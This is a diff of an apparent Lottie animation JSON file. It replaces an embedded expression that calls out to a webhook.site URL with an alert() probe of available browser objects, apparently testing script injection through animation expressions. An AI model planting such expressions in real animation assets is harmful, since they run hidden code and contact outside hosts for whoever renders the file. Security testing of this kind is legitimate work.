@@ -32,7 +32,7 @@
         "s": {
           "a": 0,
           "k": [100, 100, 100],
-          "x": "var r=new XMLHttpRequest();r.open('GET','https://webhook.site/c757fa82-277c-454f-8048-d5d47159abc5',false);r.send();var $bm_rt=[100,100];$bm_rt;"
+          "x": "(alert(typeof document+' | '+typeof JSON+' | '+typeof Image), [100,100])"
         }
       },
       "ip": 0,
